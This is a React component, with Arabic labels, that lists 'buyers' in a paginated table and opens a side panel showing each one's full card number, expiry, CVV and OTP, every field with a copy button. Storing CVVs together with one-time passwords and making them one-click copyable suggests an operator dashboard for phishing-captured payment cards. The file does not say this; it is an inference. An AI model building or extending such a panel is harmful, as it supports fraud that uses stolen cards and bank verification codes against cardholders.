'use client';

import * as React from 'react';
import {
  ColumnDef,
  flexRender,
  getCoreRowModel,
  useReactTable,
} from '@tanstack/react-table';

import { Button } from '@/components/ui/button';
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
} from '@/components/ui/sheet';

import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { BuyerRow } from './columns';
import { ClipboardButton } from './ui/clipboard-button';

interface CustomTableMeta {
  openDetails: (buyer: BuyerRow) => void;
}

interface DataTableProps<TData, TValue> {
  columns: ColumnDef<TData, TValue>[];
  data: TData[];
  page: number;
  totalPages: number;
  setPage: (page: number) => void;
}

export function DataTable<TData extends BuyerRow, TValue>({
  columns,
  data,
  page,
  totalPages,
  setPage,
}: DataTableProps<TData, TValue>) {
  const [selectedBuyer, setSelectedBuyer] = React.useState<BuyerRow | null>(
    null
  );
  const [isSheetOpen, setIsSheetOpen] = React.useState(false);

  const table = useReactTable<TData>({
    data,
    columns,
    getCoreRowModel: getCoreRowModel(),

    // ⭐⭐ هنا نضيف meta مع الـ type الصح
    meta: {
      openDetails: (buyer: BuyerRow) => {
        setSelectedBuyer(buyer);
        setIsSheetOpen(true);
      },
    } satisfies CustomTableMeta,
  });

  function InfoItem({ label, value }: { label: string; value?: string }) {
    return (
      <div className="flex justify-between text-sm items-center">
        <span className="font-medium text-muted-foreground">{label}</span>
        <div className="flex items-center gap-1">
          <span className="font-semibold">{value || '—'}</span>
          <ClipboardButton value={value} />
        </div>
      </div>
    );
  }

  return (
    <div className="w-full">
      {/* ---------------- Table ---------------- */}
      <div className="overflow-hidden rounded-md border">
        <Table>
          <TableHeader>
            {table.getHeaderGroups().map((headerGroup) => (
              <TableRow key={headerGroup.id}>
                {headerGroup.headers.map((header) => (
                  <TableHead key={header.id}>
                    {header.isPlaceholder
                      ? null
                      : flexRender(
                          header.column.columnDef.header,
                          header.getContext()
                        )}
                  </TableHead>
                ))}
              </TableRow>
            ))}
          </TableHeader>

          <TableBody>
            {data.length ? (
              table.getRowModel().rows.map((row) => (
                <TableRow key={row.id}>
                  {row.getVisibleCells().map((cell) => (
                    <TableCell key={cell.id}>
                      {flexRender(
                        cell.column.columnDef.cell,
                        cell.getContext()
                      )}
                    </TableCell>
                  ))}
                </TableRow>
              ))
            ) : (
              <TableRow>
                <TableCell
                  colSpan={columns.length}
                  className="text-center h-24"
                >
                  لا يوجد بيانات.
                </TableCell>
              </TableRow>
            )}
          </TableBody>
        </Table>
      </div>

      {/* ---------------- Pagination ---------------- */}
      <div className="flex items-center justify-end py-4 gap-3">
        <Button
          variant="outline"
          size="sm"
          onClick={() => setPage(page - 1)}
          disabled={page <= 1}
        >
          السابق
        </Button>

        <span className="text-sm">
          الصفحة {page} من {totalPages}
        </span>

        <Button
          variant="outline"
          size="sm"
          onClick={() => setPage(page + 1)}
          disabled={page >= totalPages}
        >
          التالي
        </Button>
      </div>

      {/* ---------------- Sheet ---------------- */}
      <Sheet open={isSheetOpen} onOpenChange={setIsSheetOpen}>
        <SheetContent side="right" className="w-[420px] sm:w-[480px] p-0">
          {/* Header */}
          <SheetHeader>
            <SheetTitle className="text-lg font-semibold">
              تفاصيل البطاقة
            </SheetTitle>
          </SheetHeader>

          {/* Body */}
          <div className="p-6 space-y-6">
            {/* بيانات البطاقة */}
            <div className="space-y-3">
              <h3 className="text-sm font-medium text-muted-foreground">
                معلومات البطاقة
              </h3>

              <div className="rounded-md border p-4 space-y-3 bg-white">
                <InfoItem label="الاسم" value={selectedBuyer?.name} />

                <InfoItem
                  label="رقم البطاقة"
                  value={selectedBuyer?.cardNumber}
                />
                <InfoItem
                  label="تاريخ الانتهاء"
                  value={`${selectedBuyer?.monthEx}/${selectedBuyer?.yearEx}`}
                />
                <InfoItem label="CVV" value={selectedBuyer?.cvv?.toString()} />
                <InfoItem label="OTP" value={selectedBuyer?.opt?.toString()} />
              </div>
            </div>
          </div>
        </SheetContent>
      </Sheet>
    </div>
  );
}
